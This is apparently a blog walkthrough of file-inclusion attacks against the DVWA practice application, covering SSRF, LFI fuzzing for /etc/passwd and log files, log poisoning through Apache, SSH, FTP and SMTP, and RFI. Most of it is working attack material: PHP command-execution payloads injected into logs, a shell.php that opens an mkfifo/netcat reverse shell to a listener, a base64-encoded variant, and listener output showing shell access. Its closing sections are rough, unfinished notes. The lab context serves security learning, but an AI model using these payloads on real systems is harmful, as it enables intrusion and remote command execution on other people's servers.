---
layout: post
title: lfi, rfi, ssrf - DVWA
tags: [Linux]
description: lfi, rfi, ssrf - DVWA
---

- [Configuration](#configuration)
- [SSRF](#ssrf)
- [LFI](#lfi)
    - [Log Poisoning apache](#log-posioning-apache)
    - [Log Poisoning ssh](#log-poisoning-ssh)
    - [Log Poisoning ftp](#Log-poisoning-ftp)
    - [Log Posioning smtp](#log-poisoning-smtp)
- [RFI](#rfi)


## Configuration
In order to practice all the attacks shown we must have previously installed the [**dvwa**](https://dvwa.co.uk/) application.

### Enabling function
```allow_url_fopen:``` It can be used to retrieve data from remote servers or websites. However, if used incorrectly, this feature can compromise the security of your site.

```allow_url_include:``` allows a programmer to include a remote file (such as PHP code) using a URL rather than a local file path. Use of this indicates serious design flaws.

We will have to give certain permissions for the RFI, LFI and SSRF attack to be feasible

File path: /etc/php7/apache2/php.ini

```
 851 ;;;;;;;;;;;;;;;;;;
 852 ; Fopen wrappers ;
 853 ;;;;;;;;;;;;;;;;;;
 854
 855 ; Whether to allow the treatment of URLs (like http:// or ftp://) as files.
 856 ; http://php.net/allow-url-fopen
 857 allow_url_fopen = On
 858
 859 ; Whether to allow include/require to open URLs (like http:// or ftp://) as files.
 860 ; http://php.net/allow-url-include
 861 allow_url_include = On
 862
```

We start the **apache2** and **mysql** services.

```
> service apache2 start
> sudo service mysql start
```

------

## SSRF
In computer security, **server Side Request Forgery** is a type of exploit in which an attacker abuses the functionality of a server and causes it to access or manipulate information within that server that would not otherwise be directly accessible. for the attacker

We go to the option **Inclusiond e archivos**. And we click on ```file1.php```.

![file_inclusion](/assets/imgs/dvwa2/file_inclusion.png)

In this example we are accessing a local page which would not be accessible from another device.

![ssrf](/assets/imgs/dvwa2/ssrf.png)

-----

## LFI
LFI vulnerabilities allow an attacker to read (and sometimes execute) files on the victim machine. This can be very dangerous because if the web server is misconfigured and running with high privileges, the attacker can gain access to confidential information. If the attacker can put code on the web server through other means, he may be able to execute arbitrary commands. [source](https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/)

We can discover application files by fuzzing

```
❯ ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u "http://localhost/dvwa/vulnerabilities/fi/?page=FUZZ" -b "security=low; PHPSESSID=9dpvhricbfl5aj58qses365ehk" -c -t 200 -fl=80      

        /'___\  /'___\           /'___\                                                                                                                                                       
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                                       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                                      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                      
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                       
          \/_/    \/_/   \/___/    \/_/                                                                                                                                                       

       v1.3.1 Kali Exclusive <3                                                                                                                                                               
________________________________________________                                                                                                                                              

 :: Method           : GET                                                                                                                                                                    
 :: URL              : http://localhost/dvwa/vulnerabilities/fi/?page=FUZZ                                                                                                                    
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt                                                                                            
 :: Header           : Cookie: security=low; PHPSESSID=9dpvhricbfl5aj58qses365ehk                                                                                                             
 :: Follow redirects : false                                                                                                                                                                  
 :: Calibration      : false                                                                                                                                                                  
 :: Timeout          : 10                                                                                                                                                                                              
 :: Threads          : 200                                                                                                                                                                                             
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405                                                                                                                                                
 :: Filter           : Response lines: 80                                                                                                                                                                              
________________________________________________                                                                                                                                                                       

/proc/self/stat         [Status: 200, Size: 4369, Words: 215, Lines: 81]                                                                                                                      
../../../../../../../../../etc/passwd [Status: 200, Size: 7251, Words: 193, Lines: 136]                                                                                                                                
/proc/self/fd/8         [Status: 200, Size: 119451, Words: 11460, Lines: 718]                                                                                                                                          
/etc/mysql/my.cnf       [Status: 200, Size: 5171, Words: 311, Lines: 109]                                                                                                                                              
../../../../../../etc/group [Status: 200, Size: 5331, Words: 164, Lines: 165]                                                                                                                                          
../../../../../../../../etc/group [Status: 200, Size: 5331, Words: 164, Lines: 165]                                                                                                                                    
../../../../../../../../../etc/group [Status: 200, Size: 5331, Words: 164, Lines: 165]                                                                                                                                 
../../../../../../../etc/group [Status: 200, Size: 5331, Words: 164, Lines: 165]                                                                              
../../../../../../../../../../etc/group [Status: 200, Size: 5331, Words: 164, Lines: 165]                                                                     
../../../../../../../../../../../etc/group [Status: 200, Size: 5331, Words: 164, Lines: 165]                                                                                                                           
../../../../../../../../../../../../../etc/group [Status: 200, Size: 5331, Words: 164, Lines: 165]                                                                                                                     
../../../../../../../../../../../../etc/group [Status: 200, Size: 5331, Words: 164, Lines: 165]                                                               
../../../../../../../../../../../../../../etc/group [Status: 200, Size: 5331, Words: 164, Lines: 165]                                                                                                                  
../../../../../../../../../../../../../../../var/log/apache2/access.log [Status: 200, Size: 174875, Words: 16929, Lines: 1023]                                                                                         
../../../../../../../../../../../../../../../var/log/apache2/error.log [Status: 200, Size: 547780, Words: 54819, Lines: 2420]                                                                                          
../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 7251, Words: 193, Lines: 136]                                                                                                                 
../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 7251, Words: 193, Lines: 136]                                                                                                                    
../../../../../../../../../../../etc/passwd [Status: 200, Size: 7251, Words: 193, Lines: 136]                                                                 
../../../../../../../../../../etc/passwd [Status: 200, Size: 7251, Words: 193, Lines: 136]                                                                    
../../../../../../../../../../../../etc/passwd [Status: 200, Size: 7251, Words: 193, Lines: 136]                                                                                                                       
../../../../../../../../etc/passwd [Status: 200, Size: 7251, Words: 193, Lines: 136]                                                                          
../../../../../../../etc/passwd [Status: 200, Size: 7251, Words: 193, Lines: 136]                                                                             
/proc/self/fd/2         [Status: 200, Size: 579176, Words: 57574, Lines: 2529]                                                                                
/proc/self/status       [Status: 200, Size: 5427, Words: 255, Lines: 136]                                                                                     
/etc/group              [Status: 200, Size: 5331, Words: 164, Lines: 165]                                                                                     
/etc/passwd             [Status: 200, Size: 7251, Words: 193, Lines: 136]                                                                                     
../../../../../../etc/passwd [Status: 200, Size: 7251, Words: 193, Lines: 136]                                                                                
../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 7251, Words: 193, Lines: 136]                                                                                                           
../../../../../../../../../../../../../../proc/self/fd/8 [Status: 200, Size: 196706, Words: 19071, Lines: 1142]                                                                                                        
../../../../../../../../../../../../../../../../../proc/self/fd/8 [Status: 200, Size: 197068, Words: 19107, Lines: 1144]                                                                                               
../../../../../../../../../../../../../../../../proc/self/fd/8 [Status: 200, Size: 197276, Words: 19125, Lines: 1145]                                                                                                  
../../../../../../../../../../../../../../../proc/self/fd/8 [Status: 200, Size: 197481, Words: 19143, Lines: 1146]                                                                                                     
../../../../../../../../../../../../../proc/self/fd/8 [Status: 200, Size: 197683, Words: 19161, Lines: 1147]                                                                                                           
../../../../../../../../../../proc/self/fd/8 [Status: 200, Size: 198069, Words: 19197, Lines: 1149]                                                                                                                    
../../../../../../../../../../../../proc/self/fd/8 [Status: 200, Size: 197879, Words: 19179, Lines: 1148]                                                                                                              
../../../../../../../../../../../proc/self/fd/8 [Status: 200, Size: 197879, Words: 19179, Lines: 1148]                                                                                                                 
../../../../../../../../../proc/self/fd/8 [Status: 200, Size: 198449, Words: 19233, Lines: 1151]                                                                                                                       
../../../../../../../proc/self/fd/8 [Status: 200, Size: 198449, Words: 19233, Lines: 1151]                                                                    
../../../../../../../../proc/self/fd/8 [Status: 200, Size: 198449, Words: 19233, Lines: 1151]                                                                 
../../../../../../proc/self/fd/8 [Status: 200, Size: 198627, Words: 19251, Lines: 1152]                                                                       
../../../../../../../../../../../../../../../../../../proc/self/fd/8 [Status: 200, Size: 205644, Words: 19935, Lines: 1190]                                                                                            
/var/log/apache2/error.log [Status: 200, Size: 695691, Words: 71241, Lines: 3125]                                                                             
/var/log/apache2/access.log [Status: 200, Size: 214264, Words: 20835, Lines: 1240]                                                                            
```

### Log Poisoning apache
So to replicate this attack we need to give read permissions to other users (exclusively for the www-data user).

```
> sudo chmod 775 -R /var/log/apache2
```

Now I will try to open Apache access.log file via file1.php in browser

![apache_log](/assets/imgs/dvwa2/apache_log.png)

I intercept a new request pointing to the **apache.log** to inject malicious code

As you can see, I add a php command in the [User-Agent](https://www.redeszone.net/tutoriales/redes-cable/user-agent-navegador-identificar/) in such a way that it allows executing commands within the system.

In this case I add the ```ifconfig``` command.

![burp_apache](/assets/imgs/dvwa2/burp_apache.png)

But instead of executing commands what I do is gain access to the system by injecting code to obtain a shell.

![shell_apache.png](/assets/imgs/dvwa2/shell_apache.png)

I listen

```
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.105] 59934
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
------

### Log Poisoning ssh
I start the ssh service.

```
> sudo service ssh start
```

I give full permissions to other users.

```
> sudo service chmod 777 -R /var/log/
```

I make a request to the file that saves the logs when one starts session by ssh.

![ssh_passwd](/assets/imgs/dvwa2/ssh_passwd.png)

I do a poisoning connecting by ssh.

```
❯ ssh "<?php system(\$_GET['c']); ?>"@192.168.0.105
<?php system($_GET['c']); ?>@192.168.0.105's password:
Permission denied, please try again.
```

I accept a request and add my malicious command.

![burpshell_ssh](/assets/imgs/dvwa2/burpshell_ssh.png)

```
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.105] 43162
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

------

### Log Poisoning ftp

We install the vsftpd service

We start the service.

```
> sudo service vsftpd start
```

We made a request to see if it is possible to view the service logs.

![ftplog](/assets/imgs/dvwa2/ftplog.png)

We inject php code when trying to authenticate to the machine by ftp.

```
❯ ftp 192.168.0.105
Connected to 192.168.0.105.
220 (vsFTPd 3.0.3)
Name (192.168.0.105:noroot): '<?php system($_GET['c']); ?>'
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp>
```

File: ```/Var/log/vsftpd.log```

```
❯ tail -f vsftpd.log
Fri Aug 20 01:55:53 2021 [pid 117912] CONNECT: Client "::ffff:192.168.0.105"
Fri Aug 20 01:56:04 2021 [pid 117911] ['<?php system($_GET['c']); ?>'] FAIL LOGIN: Client "::ffff:192.168.0.105"
```
We interpret a request and send a command to spawn a shell.

![ftpshell](/assets/imgs/dvwa2/ftpshell.png)

reverse shell

```
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.105] 59934
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

------

### Log poisoning smtp


```
❯ nmap localhost
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-21 13:15 -05
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000049s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 996 closed ports
PORT     STATE SERVICE
25/tcp   open  smtp
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
```


Smtp poisoning

```
❯ nc localhost 25                                   
220 mail.debiantano.lab ESMTP Postfix (Debian/GNU)  
MAIL FROM:<test@test.com>                           
250 2.1.0 Ok                                        
RCPT TO:<?php system($_GET['cmd']); ?>              
501 5.1.3 Bad recipient address syntax              
```

Obtain shell.

```
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.105] 48940
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## RFI

![rfi](/assets/imgs/dvwa2/rfi.png)

![phpinfo](/assets/imgs/dvwa2/phpinfo.png)

![shell](/assets/imgs/dvwa2/shell.png)

### shell.php
<?php

    passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.105 4444 >/tmp/f");
?>

## SHELL
❯ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.0.105 - - [18/Aug/2021 01:07:19] "GET /shell.php HTTP/1.0" 200 -

────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.105] 59934
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

------------------------------------------------------
## SHELL LFI APACHE
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.105] 60212
bash: cannot set terminal process group (35990): Inappropriate ioctl for device
bash: no job control in this shell
www-data@debiantano:/var/www/html/dvwa/vulnerabilities/fi$ whoami
whoami
www-data
www-data@debiantano:/var/www/html/dvwa/vulnerabilities/fi$



-------------------------
# LOG POISONINF SSH

ssh "<?php system('echo Y2F0IC9ldGMvcGFzc3dkCg==|base64 -d|bash'); ?>"@192.168.0.105

NO FDUNCIONA
❯ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.105 4444 >/tmp/f"|base64 -w0;echo
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4wLjEwNSA0NDQ0ID4vdG1wL2YK



------------------------------
## log poisoning ftp



SHELL
❯ ftp 192.168.0.105
Connected to 192.168.0.105.
220 (vsFTPd 3.0.3)
Name (192.168.0.105:noroot): '<?php system($_GET['c']); ?>'
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.105] 43426
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$


────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ tail -f vsftpd.log
Fri Aug 20 01:55:53 2021 [pid 117912] CONNECT: Client "::ffff:192.168.0.105"
Fri Aug 20 01:56:04 2021 [pid 117911] ['<?php system($_GET['c']); ?>'] FAIL LOGIN: Client "::ffff:192.168.0.105"
